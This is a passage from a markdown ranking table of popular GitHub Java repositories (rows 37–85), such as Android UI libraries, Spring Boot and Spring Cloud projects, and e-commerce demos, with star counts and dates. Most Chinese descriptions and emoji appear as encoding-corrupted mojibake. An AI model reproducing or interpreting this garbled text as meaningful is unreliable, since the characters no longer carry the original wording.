|37|[JessYanCoding/AndroidAutoSize](https://github.com/JessYanCoding/AndroidAutoSize)|üî• A low-cost Android screen adaptation solution (‰ªäÊó•Â§¥Êù°Â±èÂπïÈÄÇÈÖçÊñπÊ°àÁªàÊûÅÁâàÔºå‰∏Ä‰∏™ÊûÅ‰ΩéÊàêÊú¨ÁöÑ Android Â±èÂπïÈÄÇÈÖçÊñπÊ°à).|10.7k|Java|07/15|
|38|[youth5201314/banner](https://github.com/youth5201314/banner)|üî•üî•üî•Banner 2.0 Êù•‰∫ÜÔºÅAndroidÂπøÂëäÂõæÁâáËΩÆÊí≠Êéß‰ª∂ÔºåÂÜÖÈÉ®Âü∫‰∫éViewPager2ÂÆûÁé∞ÔºåIndicatorÂíåUIÈÉΩÂèØ‰ª•Ëá™ÂÆö‰πâ„ÄÇ|10.5k|Java|08/25|
|39|[jeasonlzy/okhttp-OkGo](https://github.com/jeasonlzy/okhttp-OkGo)|OkGo - 3.0 ÈúáÊíºÊù•Ë¢≠ÔºåËØ•Â∫ìÊòØÂü∫‰∫é Http ÂçèËÆÆÔºåÂ∞ÅË£Ö‰∫Ü OkHttp ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÊØî Retrofit Êõ¥ÁÆÄÂçïÊòìÁî®ÔºåÊîØÊåÅ RxJavaÔºåRxJava2ÔºåÊîØÊåÅËá™ÂÆö‰πâÁºìÂ≠òÔºåÊîØÊåÅÊâπÈáèÊñ≠ÁÇπ‰∏ãËΩΩÁÆ°ÁêÜÂíåÊâπÈáè‰∏ä‰º†ÁÆ°ÁêÜÂäüËÉΩ|10.2k|Java|05/09|
|40|[JessYanCoding/MVPArms](https://github.com/JessYanCoding/MVPArms)|‚öîÔ∏è A common architecture for Android applications developing based on MVP, integrates many open source projects, to make your developing quicker and easier (‰∏Ä‰∏™Êï¥Âêà‰∫ÜÂ§ßÈáè‰∏ªÊµÅÂºÄÊ∫êÈ°πÁõÆÈ´òÂ∫¶ÂèØÈÖçÁΩÆÂåñÁöÑ Android MVP Âø´ÈÄüÈõÜÊàêÊ°ÜÊû∂). |9.8k|Java|10/20|
|41|[pagehelper/Mybatis-PageHelper](https://github.com/pagehelper/Mybatis-PageHelper)|MybatisÈÄöÁî®ÂàÜÈ°µÊèí‰ª∂|9.8k|Java|10/13|
|42|[justauth/JustAuth](https://github.com/justauth/JustAuth)|:100: Â∞èËÄåÂÖ®ËÄåÁæéÁöÑÁ¨¨‰∏âÊñπÁôªÂΩïÂºÄÊ∫êÁªÑ‰ª∂„ÄÇÁõÆÂâçÂ∑≤ÊîØÊåÅGithub„ÄÅGitee„ÄÅÂæÆÂçö„ÄÅÈíâÈíâ„ÄÅÁôæÂ∫¶„ÄÅCoding„ÄÅËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÂπ≥Âè∞„ÄÅOSChina„ÄÅÊîØ‰ªòÂÆù„ÄÅQQ„ÄÅÂæÆ‰ø°„ÄÅÊ∑òÂÆù„ÄÅGoogle„ÄÅFacebook„ÄÅÊäñÈü≥„ÄÅÈ¢ÜËã±„ÄÅÂ∞èÁ±≥„ÄÅÂæÆËΩØ„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅTeambition„ÄÅStackOverflow„ÄÅPinterest„ÄÅ‰∫∫‰∫∫„ÄÅÂçé‰∏∫„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÈÖ∑ÂÆ∂‰πê„ÄÅGitlab„ÄÅÁæéÂõ¢„ÄÅÈ•ø‰∫Ü‰πàÂíåÊé®ÁâπÁ≠âÁ¨¨‰∏âÊñπÂπ≥Âè∞ÁöÑÊéàÊùÉÁôªÂΩï„ÄÇ Login, so easy!|9.5k|Java|10/25|
|43|[LuckSiege/PictureSelector](https://github.com/LuckSiege/PictureSelector)|Picture Selector Library for Android  or ÂõæÁâáÈÄâÊã©Âô®|9.4k|Java|10/29|
|44|[seaswalker/spring-analysis](https://github.com/seaswalker/spring-analysis)|SpringÊ∫êÁ†ÅÈòÖËØª|9.2k|Java|10/13|
|45|[frank-lam/fullstack-tutorial](https://github.com/frank-lam/fullstack-tutorial)|üöÄ fullstack tutorial 2020ÔºåÂêéÂè∞ÊäÄÊúØÊ†à/Êû∂ÊûÑÂ∏à‰πãË∑Ø/ÂÖ®Ê†àÂºÄÂèëÁ§æÂå∫ÔºåÊò•Êãõ/ÁßãÊãõ/Ê†°Êãõ/Èù¢ËØï|9.0k|Java|05/30|
|46|[daniulive/SmarterStreaming](https://github.com/daniulive/SmarterStreaming)|‰∏öÂÜÖ‰∏∫Êï∞‰∏çÂ§öËá¥Âäõ‰∫éÊûÅËá¥‰ΩìÈ™åÁöÑË∂ÖÂº∫ÂÖ®Ëá™Á†îË∑®Âπ≥Âè∞(windows/android/iOS)ÊµÅÂ™í‰ΩìÂÜÖÊ†∏ÔºåÈÄöËøáÊ®°ÂùóÂåñËá™Áî±ÁªÑÂêàÔºåÊîØÊåÅÂÆûÊó∂RTMPÊé®ÊµÅ„ÄÅRTSPÊé®ÊµÅ„ÄÅRTMPÊí≠ÊîæÂô®„ÄÅRTSPÊí≠ÊîæÂô®„ÄÅÂΩïÂÉè„ÄÅÂ§öË∑ØÊµÅÂ™í‰ΩìËΩ¨Âèë„ÄÅÈü≥ËßÜÈ¢ëÂØºÊí≠„ÄÅÂä®ÊÄÅËßÜÈ¢ëÂêàÊàê„ÄÅÈü≥È¢ëÊ∑∑Èü≥„ÄÅÁõ¥Êí≠‰∫íÂä®„ÄÅÂÜÖÁΩÆËΩªÈáèÁ∫ßRTSPÊúçÂä°Á≠âÔºåÊØîÂø´Êõ¥Âø´Ôºå‰∏öÁïåÁúüÊ≠£Èù†Ë∞±ÁöÑË∂Ö‰ΩéÂª∂ËøüÁõ¥Êí≠SDK(1ÁßíÂÜÖÔºå‰ΩéÂª∂ËøüÊ®°Âºè‰∏ã200~400ms)„ÄÇ|9.0k|Java|10/27|
|47|[gyf-dev/ImmersionBar](https://github.com/gyf-dev/ImmersionBar)|android 4.4‰ª•‰∏äÊ≤âÊµ∏ÂºèÁä∂ÊÄÅÊ†èÂíåÊ≤âÊµ∏ÂºèÂØºËà™Ê†èÁÆ°ÁêÜÔºåÈÄÇÈÖçÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂàòÊµ∑Â±è„ÄÅËΩØÈîÆÁõòÂºπÂá∫Á≠âÈóÆÈ¢òÔºåÂèØ‰ª•‰øÆÊîπÁä∂ÊÄÅÊ†èÂ≠ó‰ΩìÈ¢úËâ≤ÂíåÂØºËà™Ê†èÂõæÊ†áÈ¢úËâ≤Ôºå‰ª•Âèä‰∏çÂèØ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤ÊâãÊú∫ÁöÑÈÄÇÈÖçÔºåÈÄÇÁî®‰∫éActivity„ÄÅFragment„ÄÅDialogFragment„ÄÅDialogÔºåPopupWindowÔºå‰∏ÄÂè•‰ª£Á†ÅËΩªÊùæÂÆûÁé∞Ôºå‰ª•ÂèäÂØπbarÁöÑÂÖ∂‰ªñËÆæÁΩÆÔºåËØ¶ËßÅREADME„ÄÇÁÆÄ‰π¶ËØ∑ÂèÇËÄÉÔºöhttp://www.jianshu.com/p/2a884e211a62|8.9k|Java|10/16|
|48|[bilibili/DanmakuFlameMaster](https://github.com/bilibili/DanmakuFlameMaster)|AndroidÂºÄÊ∫êÂºπÂπïÂºïÊìé¬∑ÁÉàÁÑ∞ÂºπÂπï‰Ωø ÔΩû|8.7k|Java|02/27|
|49|[paascloud/paascloud-master](https://github.com/paascloud/paascloud-master)|spring cloud + vue + oAuth2.0ÂÖ®ÂÆ∂Ê°∂ÂÆûÊàòÔºåÂâçÂêéÁ´ØÂàÜÁ¶ªÊ®°ÊãüÂïÜÂüéÔºåÂÆåÊï¥ÁöÑË¥≠Áâ©ÊµÅÁ®ã„ÄÅÂêéÁ´ØËøêËê•Âπ≥Âè∞ÔºåÂèØ‰ª•ÂÆûÁé∞Âø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°È°πÁõÆ„ÄÇÊîØÊåÅÂæÆ‰ø°ÁôªÂΩïÁ≠â‰∏âÊñπÁôªÂΩï„ÄÇ|8.5k|Java|07/02|
|50|[zhisheng17/flink-learning](https://github.com/zhisheng17/flink-learning)|flink learning blog. http://www.flink-learning.com  Âê´ Flink ÂÖ•Èó®„ÄÅÊ¶ÇÂøµ„ÄÅÂéüÁêÜ„ÄÅÂÆûÊàò„ÄÅÊÄßËÉΩË∞É‰ºò„ÄÅÊ∫êÁ†ÅËß£ÊûêÁ≠âÂÜÖÂÆπ„ÄÇÊ∂âÂèä Flink Connector„ÄÅMetrics„ÄÅLibrary„ÄÅDataStream API„ÄÅTable API & SQL Á≠âÂÜÖÂÆπÁöÑÂ≠¶‰π†Ê°à‰æãÔºåËøòÊúâ Flink ËêΩÂú∞Â∫îÁî®ÁöÑÂ§ßÂûãÈ°πÁõÆÊ°à‰æãÔºàPVUV„ÄÅÊó•ÂøóÂ≠òÂÇ®„ÄÅÁôæ‰∫øÊï∞ÊçÆÂÆûÊó∂ÂéªÈáç„ÄÅÁõëÊéßÂëäË≠¶ÔºâÂàÜ‰∫´„ÄÇÊ¨¢ËøéÂ§ßÂÆ∂ÊîØÊåÅÊàëÁöÑ‰∏ìÊ†è„ÄäÂ§ßÊï∞ÊçÆÂÆûÊó∂ËÆ°ÁÆóÂºïÊìé Flink ÂÆûÊàò‰∏éÊÄßËÉΩ‰ºòÂåñ„Äã|8.4k|Java|10/17|
|51|[hyb1996/Auto.js](https://github.com/hyb1996/Auto.js)|A UiAutomator on android, does not need root access(ÂÆâÂçìÂπ≥Âè∞‰∏äÁöÑJavaScriptËá™Âä®ÂåñÂ∑•ÂÖ∑)|8.3k|Java|10/07|
|52|[lihengming/spring-boot-api-project-seed](https://github.com/lihengming/spring-boot-api-project-seed)|:seedling::rocket:‰∏Ä‰∏™Âü∫‰∫éSpring Boot & MyBatisÁöÑÁßçÂ≠êÈ°πÁõÆÔºåÁî®‰∫éÂø´ÈÄüÊûÑÂª∫‰∏≠Â∞èÂûãAPI„ÄÅRESTful APIÈ°πÁõÆ~|8.3k|Java|10/22|
|53|[YunaiV/SpringBoot-Labs](https://github.com/YunaiV/SpringBoot-Labs)|‰∏Ä‰∏™Ê∂µÁõñÂÖ≠‰∏™‰∏ìÊ†èÔºöSpring Boot 2.X„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅDubbo„ÄÅÂàÜÂ∏ÉÂºèÊ∂àÊÅØÈòüÂàó„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°ÁöÑ‰ªìÂ∫ì„ÄÇÂ∏åÊúõËÉñÂèãÂ∞èÊâã‰∏ÄÊäñÔºåÂè≥‰∏äËßíÊù•‰∏™ StarÔºåÊÑüÊÅ© 1024|8.2k|Java|10/23|
|54|[APIJSON/APIJSON](https://github.com/APIJSON/APIJSON)|üèÜÁ†Å‰∫ëÊúÄÊúâ‰ª∑ÂÄºÂºÄÊ∫êÈ°πÁõÆ üöÄÂêéÁ´ØÊé•Âè£ÂíåÊñáÊ°£Ëá™Âä®ÂåñÔºåÂâçÁ´Ø(ÂÆ¢Êà∑Á´Ø) ÂÆöÂà∂ËøîÂõû JSON ÁöÑÊï∞ÊçÆÂíåÁªìÊûÑÔºÅüèÜGitee Most Valuable Project üöÄA JSON Transmission Protocol and an ORM Library for automatically providing APIs and Docs.|8.2k|Java|10/27|
|55|[heibaiying/BigData-Notes](https://github.com/heibaiying/BigData-Notes)|Â§ßÊï∞ÊçÆÂÖ•Èó®ÊåáÂçó  :star:|8.2k|Java|10/20|
|56|[hackware1993/MagicIndicator](https://github.com/hackware1993/MagicIndicator)|A powerful, customizable and extensible ViewPager indicator framework. As the best alternative of ViewPagerIndicator, TabLayout and PagerSlidingTabStrip   ‚Äî‚Äî   Âº∫Â§ß„ÄÅÂèØÂÆöÂà∂„ÄÅÊòìÊâ©Â±ïÁöÑ ViewPager ÊåáÁ§∫Âô®Ê°ÜÊû∂„ÄÇÊòØViewPagerIndicator„ÄÅTabLayout„ÄÅPagerSlidingTabStripÁöÑÊúÄ‰Ω≥Êõø‰ª£ÂìÅ„ÄÇÊîØÊåÅËßíÊ†áÔºåÊõ¥ÊîØÊåÅÂú®ÈùûViewPagerÂú∫ÊôØ‰∏ã‰ΩøÁî®Ôºà‰ΩøÁî®hide()„ÄÅshow()ÂàáÊç¢FragmentÊàñ‰ΩøÁî®se ...|8.2k|Java|09/29|
|57|[hs-web/hsweb-framework](https://github.com/hs-web/hsweb-framework)|hsweb (ha äs w…õb) ÊòØ‰∏Ä‰∏™Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂü∫Á°ÄÈ°πÁõÆ,ÈõÜÊàê‰∏ÄÊèΩÂ≠ê‰æøÊç∑ÂäüËÉΩÂ¶Ç:‰æøÊç∑ÁöÑÈÄöÁî®Â¢ûÂà†ÊîπÊü•,Âº∫Â§ßÁöÑÊùÉÈôêÁÆ°ÁêÜ,Âä®ÊÄÅÂ§öÊï∞ÊçÆÊ∫ê,Âä®ÊÄÅË°®Âçï,Âú®Á∫øÊï∞ÊçÆÂ∫ìÁª¥Êä§Á≠â. Âü∫‰∫é spring-boot,mybaits.|7.4k|Java|10/29|
|58|[DuGuQiuBai/Java](https://github.com/DuGuQiuBai/Java)|27Â§©Êàê‰∏∫JavaÂ§ßÁ•û|7.3k|Java|10/18|
|59|[macrozheng/mall-learning](https://github.com/macrozheng/mall-learning)|mallÂ≠¶‰π†ÊïôÁ®ãÔºåÊû∂ÊûÑ„ÄÅ‰∏öÂä°„ÄÅÊäÄÊúØË¶ÅÁÇπÂÖ®Êñπ‰ΩçËß£Êûê„ÄÇmallÈ°πÁõÆÔºà39k+starÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºå‰ΩøÁî®Áé∞Èò∂ÊÆµ‰∏ªÊµÅÊäÄÊúØÂÆûÁé∞„ÄÇÊ∂µÁõñ‰∫ÜSpringBoot 2.3.0„ÄÅMyBatis 3.4.6„ÄÅElasticsearch 7.6.2„ÄÅRabbitMQ 3.7.15„ÄÅRedis 5.0„ÄÅMongoDB 4.2.5„ÄÅMysql5.7Á≠âÊäÄÊúØÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ|7.1k|Java|10/28|
|60|[huanghaibin-dev/CalendarView](https://github.com/huanghaibin-dev/CalendarView)|Android‰∏ä‰∏Ä‰∏™‰ºòÈõÖ„ÄÅ‰∏áËÉΩËá™ÂÆö‰πâUI„ÄÅÊîØÊåÅÂë®ËßÜÂõæ„ÄÅËá™ÂÆö‰πâÂë®Ëµ∑Âßã„ÄÅÊÄßËÉΩÈ´òÊïàÁöÑÊó•ÂéÜÊéß‰ª∂ÔºåÊîØÊåÅÁÉ≠ÊèíÊãîÂÆûÁé∞ÁöÑUIÂÆöÂà∂ÔºÅÊîØÊåÅÊ†áËÆ∞„ÄÅËá™ÂÆö‰πâÈ¢úËâ≤„ÄÅÂÜúÂéÜ„ÄÅËá™ÂÆö‰πâÊúàËßÜÂõæÂêÑÁßçÊòæÁ§∫Ê®°ÂºèÁ≠â„ÄÇCanvasÁªòÂà∂ÔºåÈÄüÂ∫¶Âø´„ÄÅÂç†Áî®ÂÜÖÂ≠ò‰ΩéÔºå‰Ω†ÁúüÁöÑÊÉ≥‰∏çÂà∞Êó•ÂéÜÂ±ÖÁÑ∂ËøòÂèØ‰ª•Â¶ÇÊ≠§‰ºòÈõÖÔºÅAn elegant, highly customized and high-performance Calendar Widget on Android.|7.1k|Java|09/16|
|61|[crossoverJie/cim](https://github.com/crossoverJie/cim)|üì≤cim(cross IM) ÈÄÇÁî®‰∫éÂºÄÂèëËÄÖÁöÑÂàÜÂ∏ÉÂºèÂç≥Êó∂ÈÄöËÆØÁ≥ªÁªü|6.9k|Java|10/13|
|62|[alibaba/otter](https://github.com/alibaba/otter)|ÈòøÈáåÂ∑¥Â∑¥ÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÂêåÊ≠•Á≥ªÁªü(Ëß£ÂÜ≥‰∏≠ÁæéÂºÇÂú∞Êú∫Êàø)|6.2k|Java|10/13|
|63|[dyc87112/SpringCloud-Learning](https://github.com/dyc87112/SpringCloud-Learning)|Spring CloudÂü∫Á°ÄÊïôÁ®ãÔºåÊåÅÁª≠ËøûËΩΩÊõ¥Êñ∞‰∏≠|6.2k|Java|09/10|
|64|[gedoor/MyBookshelf](https://github.com/gedoor/MyBookshelf)|ÈòÖËØªÊòØ‰∏ÄÊ¨æÂèØ‰ª•Ëá™ÂÆö‰πâÊù•Ê∫êÈòÖËØªÁΩëÁªúÂÜÖÂÆπÁöÑÂ∑•ÂÖ∑Ôºå‰∏∫ÂπøÂ§ßÁΩëÁªúÊñáÂ≠¶Áà±Â•ΩËÄÖÊèê‰æõ‰∏ÄÁßçÊñπ‰æø„ÄÅÂø´Êç∑ËàíÈÄÇÁöÑËØïËØª‰ΩìÈ™å„ÄÇ|6.1k|Java|10/28|
|65|[Exrick/xmall](https://github.com/Exrick/xmall)|Âü∫‰∫éSOAÊû∂ÊûÑÁöÑÂàÜÂ∏ÉÂºèÁîµÂïÜË¥≠Áâ©ÂïÜÂüé ÂâçÂêéÁ´ØÂàÜÁ¶ª ÂâçÂè∞ÂïÜÂüé:VueÂÖ®ÂÆ∂Ê°∂ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü:Dubbo/SSM/Elasticsearch/Redis/MySQL/ActiveMQ/Shiro/ZookeeperÁ≠â|5.9k|Java|10/13|
|66|[goldze/MVVMHabit](https://github.com/goldze/MVVMHabit)|üëïÂü∫‰∫éË∞∑Ê≠åÊúÄÊñ∞AACÊû∂ÊûÑÔºåMVVMËÆæËÆ°Ê®°ÂºèÁöÑ‰∏ÄÂ•óÂø´ÈÄüÂºÄÂèëÂ∫ìÔºåÊï¥ÂêàOkhttp+RxJava+Retrofit+GlideÁ≠â‰∏ªÊµÅÊ®°ÂùóÔºåÊª°Ë∂≥Êó•Â∏∏ÂºÄÂèëÈúÄÊ±Ç„ÄÇ‰ΩøÁî®ËØ•Ê°ÜÊû∂ÂèØ‰ª•Âø´ÈÄüÂºÄÂèë‰∏Ä‰∏™È´òË¥®Èáè„ÄÅÊòìÁª¥Êä§ÁöÑAndroidÂ∫îÁî®„ÄÇ|5.9k|Java|06/05|
|67|[smuyyh/BookReader](https://github.com/smuyyh/BookReader)|:closed_book:  ""‰ªªÈòÖ"" ÁΩëÁªúÂ∞èËØ¥ÈòÖËØªÂô®Ôºå3DÁøªÈ°µÊïàÊûú„ÄÅtxt/pdf/epub‰π¶Á±çÈòÖËØª„ÄÅWifi‰º†‰π¶~|5.7k|Java|09/02|
|68|[Meituan-Dianping/walle](https://github.com/Meituan-Dianping/walle)|Android Signature V2 SchemeÁ≠æÂêç‰∏ãÁöÑÊñ∞‰∏Ä‰ª£Ê∏†ÈÅìÂåÖÊâìÂåÖÁ•ûÂô®|5.7k|Java|07/24|
|69|[NLPchina/ansj_seg](https://github.com/NLPchina/ansj_seg)|ansjÂàÜËØç.ictÁöÑÁúüÊ≠£javaÂÆûÁé∞.ÂàÜËØçÊïàÊûúÈÄüÂ∫¶ÈÉΩË∂ÖËøáÂºÄÊ∫êÁâàÁöÑict. ‰∏≠ÊñáÂàÜËØç,‰∫∫ÂêçËØÜÂà´,ËØçÊÄßÊ†áÊ≥®,Áî®Êà∑Ëá™ÂÆö‰πâËØçÂÖ∏|5.7k|Java|10/28|
|70|[sparklemotion/nokogiri](https://github.com/sparklemotion/nokogiri)|Nokogiri (Èã∏) is a Rubygem providing HTML, XML, SAX, and Reader parsers with XPath and CSS selector support.|5.5k|Java|10/30|
|71|[lenve/VBlog](https://github.com/lenve/VBlog)|VÈÉ®ËêΩÔºåVue+SpringBootÂÆûÁé∞ÁöÑÂ§öÁî®Êà∑ÂçöÂÆ¢ÁÆ°ÁêÜÂπ≥Âè∞!|5.5k|Java|09/04|
|72|[zouzg/mybatis-generator-gui](https://github.com/zouzg/mybatis-generator-gui)|mybatis-generatorÁïåÈù¢Â∑•ÂÖ∑ÔºåËÆ©‰Ω†ÁîüÊàê‰ª£Á†ÅÊõ¥ÁÆÄÂçïÊõ¥Âø´Êç∑|5.5k|Java|10/13|
|73|[wildfirechat/server](https://github.com/wildfirechat/server)|Âç≥Êó∂ÈÄöËÆØ(IM)Á≥ªÁªü|5.5k|Java|10/28|
|74|[ityouknow/spring-cloud-examples](https://github.com/ityouknow/spring-cloud-examples)|Spring Cloud Â≠¶‰π†Ê°à‰æãÔºåÊúçÂä°ÂèëÁé∞„ÄÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÈìæË∑ØËøΩË∏™„ÄÅÊúçÂä°ÁõëÊéßÁ≠â|5.4k|Java|07/29|
|75|[knightliao/disconf](https://github.com/knightliao/disconf)|Distributed Configuration Management Platform(ÂàÜÂ∏ÉÂºèÈÖçÁΩÆÁÆ°ÁêÜÂπ≥Âè∞)|5.4k|Java|04/07|
|76|[jpush/aurora-imui](https://github.com/jpush/aurora-imui)|General IM UI components. Android/iOS/RectNative ready.  ÈÄöÁî® IM ËÅäÂ§© UI ÁªÑ‰ª∂ÔºåÂ∑≤ÁªèÂêåÊó∂ÊîØÊåÅ Android/iOS/RN„ÄÇ|5.3k|Java|09/04|
|77|[sohutv/cachecloud](https://github.com/sohutv/cachecloud)|ÊêúÁãêËßÜÈ¢ë(sohu tv)RedisÁßÅÊúâ‰∫ëÂπ≥Âè∞|5.3k|Java|10/16|
|78|[zhoutaoo/SpringCloud](https://github.com/zhoutaoo/SpringCloud)|Âü∫‰∫éSpringCloud2.1ÁöÑÂæÆÊúçÂä°ÂºÄÂèëËÑöÊâãÊû∂ÔºåÊï¥Âêà‰∫Üspring-security-oauth2„ÄÅnacos„ÄÅfeign„ÄÅsentinel„ÄÅspringcloud-gatewayÁ≠â„ÄÇÊúçÂä°Ê≤ªÁêÜÊñπÈù¢ÂºïÂÖ•elasticsearch„ÄÅskywalking„ÄÅspringboot-admin„ÄÅzipkinÁ≠âÔºåËÆ©È°πÁõÆÂºÄÂèëÂø´ÈÄüËøõÂÖ•‰∏öÂä°ÂºÄÂèëÔºåËÄå‰∏çÈúÄËøáÂ§öÊó∂Èó¥Ëä±Ë¥πÂú®Êû∂ÊûÑÊê≠Âª∫‰∏ä„ÄÇÊåÅÁª≠Êõ¥Êñ∞‰∏≠|5.2k|Java|10/13|
|79|[KunMinX/Jetpack-MVVM-Best-Practice](https://github.com/KunMinX/Jetpack-MVVM-Best-Practice)|ÊòØ ÈöæÂæó‰∏ÄËßÅ ÁöÑ Jetpack MVVM ÊúÄ‰Ω≥ÂÆûË∑µÔºÅÂú® ‰ª•ÁÆÄÈ©≠ÁπÅ ÁöÑ‰ª£Á†Å‰∏≠ÔºåÂØπ ËßÜÂõæÊéßÂà∂Âô® ‰πÉËá≥ Ê†áÂáÜÂåñÂºÄÂèëÊ®°Âºè ÂΩ¢ÊàêÊ≠£Á°Æ„ÄÅÊ∑±ÂÖ•ÁöÑÁêÜËß£ÔºÅ|5.2k|Java|10/28|
|80|[liyifeng1994/ssm](https://github.com/liyifeng1994/ssm)|ÊâãÊääÊâãÊïô‰Ω†Êï¥ÂêàÊúÄ‰ºòÈõÖSSMÊ°ÜÊû∂ÔºöSpringMVC + Spring + MyBatis|5.2k|Java|10/13|
|81|[macrozheng/mall-swarm](https://github.com/macrozheng/mall-swarm)|mall-swarmÊòØ‰∏ÄÂ•óÂæÆÊúçÂä°ÂïÜÂüéÁ≥ªÁªüÔºåÈááÁî®‰∫Ü Spring Cloud Hoxton & Alibaba„ÄÅSpring Boot 2.3„ÄÅOauth2„ÄÅMyBatis„ÄÅDocker„ÄÅElasticsearchÁ≠âÊ†∏ÂøÉÊäÄÊúØÔºåÂêåÊó∂Êèê‰æõ‰∫ÜÂü∫‰∫éVueÁöÑÁÆ°ÁêÜÂêéÂè∞Êñπ‰æøÂø´ÈÄüÊê≠Âª∫Á≥ªÁªü„ÄÇmall-swarmÂú®ÁîµÂïÜ‰∏öÂä°ÁöÑÂü∫Á°ÄÈõÜÊàê‰∫ÜÊ≥®ÂÜå‰∏≠ÂøÉ„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÁõëÊéß‰∏≠ÂøÉ„ÄÅÁΩëÂÖ≥Á≠âÁ≥ªÁªüÂäüËÉΩ„ÄÇÊñáÊ°£ÈΩêÂÖ®ÔºåÈôÑÂ∏¶ÂÖ®Â•óSpring CloudÊïôÁ®ã„ÄÇ|5.1k|Java|10/18|
|82|[febsteam/FEBS-Shiro](https://github.com/febsteam/FEBS-Shiro)|Spring Boot 2.2.5ÔºåShiro1.4.2 & Layui 2.5.5 ÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÈ¢ÑËßàÂú∞ÂùÄÔºöhttp://47.104.70.138:8080/login|5.1k|Java|10/28|
|83|[newbee-ltd/newbee-mall](https://github.com/newbee-ltd/newbee-mall)|newbee-mall È°πÁõÆÔºàÊñ∞ËúÇÂïÜÂüéÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ newbee-mall ÂïÜÂüéÁ≥ªÁªüÂèä newbee-mall-admin ÂïÜÂüéÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫é Spring Boot 2.X ÂèäÁõ∏ÂÖ≥ÊäÄÊúØÊ†àÂºÄÂèë„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÂàÜÁ±ª„ÄÅÊñ∞ÂìÅ‰∏äÁ∫ø„ÄÅÈ¶ñÈ°µËΩÆÊí≠„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÁªìÁÆó„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰∏™‰∫∫ËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´Êï∞ÊçÆÈù¢Êùø„ÄÅËΩÆÊí≠ÂõæÁÆ°ÁêÜ„ÄÅÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅÂàÜÁ±ªÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|5.1k|Java|10/15|
|84|[li-xiaojun/XPopup](https://github.com/li-xiaojun/XPopup)|üî•XPopup2.0ÁâàÊú¨ÈáçÁ£ÖÊù•Ë¢≠Ôºå2ÂÄç‰ª•‰∏äÊÄßËÉΩÊèêÂçáÔºåÂ∏¶Êù•ÂèØËßÇÁöÑÂä®ÁîªÊÄßËÉΩ‰ºòÂåñÂíå‰∫§‰∫íÁªÜËäÇÁöÑÊèêÂçáÔºÅÔºÅÔºÅÂäüËÉΩÂº∫Â§ßÔºå‰∫§‰∫í‰ºòÈõÖÔºåÂä®Áîª‰∏ùÊªëÁöÑÈÄöÁî®ÂºπÁ™óÔºÅÂèØ‰ª•Êõø‰ª£DialogÔºåPopupWindowÔºåPopupMenuÔºåBottomSheetÔºåDrawerLayoutÔºåSpinnerÁ≠âÁªÑ‰ª∂ÔºåËá™Â∏¶ÂçÅÂá†ÁßçÊïàÊûúËâØÂ•ΩÁöÑÂä®ÁîªÔºå ÊîØÊåÅÂÆåÂÖ®ÁöÑUIÂíåÂä®ÁîªËá™ÂÆö‰πâÔºÅ(Powerful and Beautiful PopupÔºåcan absolutely replace DialogÔºåPopupWindowÔºåPopupMenuÔºåBottomSheetÔºåDrawerLayoutÔºåSpinner. With built-in anima ...|5.0k|Java|10/29|
|85|[gzu-liyujiang/AndroidPicker](https://github.com/gzu-liyujiang/AndroidPicker)| „ÄêÊä±Ê≠âÔºåÊöÇÂÅúÁª¥Êä§ÔºåÊõø‰ª£ÂìÅÔºöhttps://github.com/Bigkoo/Android-PickerView„Äë ÂÆâÂçìÈÄâÊã©Âô®Á±ªÂ∫ìÔºåÂåÖÊã¨Êó•ÊúüÈÄâÊã©Âô®„ÄÅÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÂçïÈ°πÈÄâÊã©Âô®„ÄÅÂèåÈ°πÈÄâÊã©Âô®„ÄÅÂüéÂ∏ÇÂú∞ÂùÄÈÄâÊã©Âô®„ÄÅËΩ¶ÁâåÂè∑ÈÄâÊã©Âô®„ÄÅÊï∞Â≠óÈÄâÊã©Âô®„ÄÅÊòüÂ∫ßÈÄâÊã©Âô®„ÄÅÁîüËÇñÈÄâÊã©Âô®„ÄÅÈ¢úËâ≤ÈÄâÊã©Âô®„ÄÅÊñá‰ª∂ÈÄâÊã©Âô®„ÄÅÁõÆÂΩïÈÄâÊã©Âô®Á≠â‚Ä¶‚Ä¶WheelPicker/DateTimePicker/DatePicker/TimePicker/SinglePicker/NumberPicker/DoublePicker/LinkagePicker/AddressPicker/CalendarPicker/ColorPicker/FilePicker 